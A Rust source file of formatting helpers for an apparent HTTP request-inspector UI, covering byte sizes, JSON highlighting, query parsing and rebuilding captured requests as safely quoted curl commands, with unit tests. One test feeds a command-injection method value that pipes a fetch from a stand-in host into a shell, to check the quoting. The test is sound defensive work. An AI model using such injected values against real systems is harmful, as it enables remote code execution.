//! Pure formatting helpers (no DOM), unit-tested natively.

use serde_json::Value;
use shared::RequestDetail;

pub fn size(bytes: i32) -> String {
    let b = f64::from(bytes);
    if bytes < 1024 {
        format!("{bytes} B")
    } else if bytes < 1_048_576 {
        format!("{:.1} KB", b / 1024.0)
    } else {
        format!("{:.1} MB", b / 1_048_576.0)
    }
}

/// CSS class for a method badge.
pub fn method_class(method: &str) -> &'static str {
    match method {
        "GET" => "m m-get",
        "POST" => "m m-post",
        "PUT" => "m m-put",
        "PATCH" => "m m-patch",
        "DELETE" => "m m-delete",
        _ => "m m-other",
    }
}

pub fn short_id(id: &uuid::Uuid) -> String {
    id.simple().to_string().chars().take(8).collect()
}

/// Split "a=1&b=2" into pairs; `decode` handles percent-decoding (JS side).
pub fn query_pairs(query: &str, decode: impl Fn(&str) -> String) -> Vec<(String, String)> {
    query
        .split('&')
        .filter(|p| !p.is_empty())
        .map(|p| {
            let (k, v) = p.split_once('=').unwrap_or((p, ""));
            (decode(&k.replace('+', " ")), decode(&v.replace('+', " ")))
        })
        .collect()
}

/// Shell-safe single quoting.
fn sq(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Rebuild the captured request as a curl command.
pub fn curl(detail: &RequestDetail, hook_url: &str) -> String {
    let s = &detail.summary;
    let mut url = match s.path.as_str() {
        "/" => hook_url.to_owned(),
        path => format!("{hook_url}{path}"),
    };
    if !s.query.is_empty() {
        url = format!("{url}?{}", s.query);
    }
    // Method is attacker-controlled too (HTTP token chars include | & $ `).
    let mut out = format!("curl -X {} {}", sq(&s.method), sq(&url));
    const SKIP: [&str; 5] = ["host", "content-length", "connection", "x-forwarded-for", "x-real-ip"];
    for (k, v) in detail.headers.iter().filter(|(k, _)| !SKIP.contains(&k.as_str())) {
        out.push_str(&format!(" \\\n  -H {}", sq(&format!("{k}: {v}"))));
    }
    if let shared::Body::Text(body) = &detail.body
        && !body.is_empty()
    {
        out.push_str(&format!(" \\\n  --data-raw {}", sq(body)));
    }
    out
}

/// Syntax token for highlighted JSON.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Tok {
    Punct,
    Key,
    Str,
    Num,
    Bool,
    Null,
}

impl Tok {
    pub fn class(self) -> &'static str {
        match self {
            Tok::Punct => "j-p",
            Tok::Key => "j-k",
            Tok::Str => "j-s",
            Tok::Num => "j-n",
            Tok::Bool => "j-b",
            Tok::Null => "j-z",
        }
    }
}

/// Pretty-print JSON into colored tokens, 2-space indent.
pub fn json_tokens(value: &Value) -> Vec<(Tok, String)> {
    let mut out = Vec::new();
    walk(value, 0, &mut out);
    out
}

fn push(out: &mut Vec<(Tok, String)>, tok: Tok, text: impl Into<String>) {
    out.push((tok, text.into()));
}

fn quoted(s: &str) -> String {
    serde_json::to_string(s).unwrap_or_else(|_| format!("\"{s}\""))
}

fn walk(value: &Value, depth: usize, out: &mut Vec<(Tok, String)>) {
    let pad = |d: usize| "  ".repeat(d);
    match value {
        Value::Null => push(out, Tok::Null, "null"),
        Value::Bool(b) => push(out, Tok::Bool, b.to_string()),
        Value::Number(n) => push(out, Tok::Num, n.to_string()),
        Value::String(s) => push(out, Tok::Str, quoted(s)),
        Value::Array(items) if items.is_empty() => push(out, Tok::Punct, "[]"),
        Value::Object(map) if map.is_empty() => push(out, Tok::Punct, "{}"),
        Value::Array(items) => {
            push(out, Tok::Punct, "[\n");
            for (i, item) in items.iter().enumerate() {
                push(out, Tok::Punct, pad(depth + 1));
                walk(item, depth + 1, out);
                push(out, Tok::Punct, if i + 1 < items.len() { ",\n" } else { "\n" });
            }
            push(out, Tok::Punct, format!("{}]", pad(depth)));
        }
        Value::Object(map) => {
            push(out, Tok::Punct, "{\n");
            for (i, (k, v)) in map.iter().enumerate() {
                push(out, Tok::Punct, pad(depth + 1));
                push(out, Tok::Key, quoted(k));
                push(out, Tok::Punct, ": ");
                walk(v, depth + 1, out);
                push(out, Tok::Punct, if i + 1 < map.len() { ",\n" } else { "\n" });
            }
            push(out, Tok::Punct, format!("{}}}", pad(depth)));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use shared::{Body, RequestSummary};

    fn joined(raw: &str) -> String {
        let v: Value = serde_json::from_str(raw).unwrap_or(Value::Null);
        json_tokens(&v).into_iter().map(|t| t.1).collect()
    }

    #[test]
    fn json_keeps_order_and_precision() {
        let out = joined(r#"{"z":1,"a":12345678901234567890123,"f":1.10}"#);
        assert_eq!(out, "{\n  \"z\": 1,\n  \"a\": 12345678901234567890123,\n  \"f\": 1.10\n}");
    }

    #[test]
    fn json_nested_and_empty() {
        assert_eq!(
            joined(r#"{"a":[],"b":{},"c":[null,true]}"#),
            "{\n  \"a\": [],\n  \"b\": {},\n  \"c\": [\n    null,\n    true\n  ]\n}"
        );
    }

    #[test]
    fn sizes() {
        assert_eq!(size(0), "0 B");
        assert_eq!(size(1023), "1023 B");
        assert_eq!(size(1536), "1.5 KB");
        assert_eq!(size(3 * 1_048_576), "3.0 MB");
    }

    #[test]
    fn query_split() {
        let pairs = query_pairs("a=1&b=&c&&d=x+y", str::to_owned);
        assert_eq!(
            pairs,
            vec![
                ("a".into(), "1".into()),
                ("b".into(), "".into()),
                ("c".into(), "".into()),
                ("d".into(), "x y".into()),
            ]
        );
    }

    #[test]
    fn curl_quotes_hostile_method() {
        let mut detail = sample();
        detail.summary.method = "X|curl$IFS'a.b'|sh".into();
        let out = curl(&detail, "http://h");
        assert!(out.starts_with(r"curl -X 'X|curl$IFS'\''a.b'\''|sh' 'http://h/x?q=1'"), "{out}");
    }

    fn sample() -> RequestDetail {
        RequestDetail {
            summary: RequestSummary {
                id: 1,
                endpoint_id: uuid::Uuid::nil(),
                method: "POST".into(),
                path: "/x".into(),
                query: "q=1".into(),
                content_type: None,
                ip: None,
                size: 0,
                received_ms: 0,
            },
            headers: vec![],
            body: Body::Text(String::new()),
        }
    }

    #[test]
    fn curl_escapes_quotes() {
        let detail = RequestDetail {
            summary: RequestSummary {
                id: 1,
                endpoint_id: uuid::Uuid::nil(),
                method: "POST".into(),
                path: "/x".into(),
                query: "q=1".into(),
                content_type: None,
                ip: None,
                size: 0,
                received_ms: 0,
            },
            headers: vec![("host".into(), "h".into()), ("x-a".into(), "it's".into())],
            body: Body::Text("{\"a\":\"b'c\"}".into()),
        };
        let out = curl(&detail, "http://localhost/h/id");
        assert!(out.starts_with("curl -X 'POST' 'http://localhost/h/id/x?q=1'"));
        assert!(out.contains(r"-H 'x-a: it'\''s'"));
        assert!(!out.contains("host: h"));
        assert!(out.contains(r#"--data-raw '{"a":"b'\''c"}'"#));
    }
}
